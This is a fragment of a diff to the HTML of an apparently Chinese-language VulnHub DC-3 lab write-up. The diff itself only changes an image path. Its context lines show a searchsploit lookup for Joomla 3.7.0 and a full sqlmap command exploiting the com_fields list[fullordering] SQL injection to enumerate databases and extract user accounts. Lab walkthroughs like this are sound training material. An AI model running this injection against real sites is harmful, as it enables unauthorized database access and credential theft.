@@ -409,7 +409,7 @@
 <p>查找一下历史漏洞</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java">searchsploit <span class="token class-name">Joomla</span> <span class="token number">3.7</span><span class="token number">.0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/image-20230202053138497.png" alt="image-20230202053138497"></p>
+<p><img src="/2023/02/02/vulnhub-dc-3/image-20230202053138497.png"></p>
 <p>存在一个 SQL 注入漏洞，尝试是否能把用户账户搞出来，直接上 sqlmap 跑</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.0.106/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> <span class="token parameter variable">--risk</span><span class="token operator">=</span><span class="token number">3</span> <span class="token parameter variable">--level</span><span class="token operator">=</span><span class="token number">5</span> --random-agent <span class="token parameter variable">--dbs</span> <span class="token parameter variable">-p</span> list<span class="token punctuation">[</span>fullordering<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
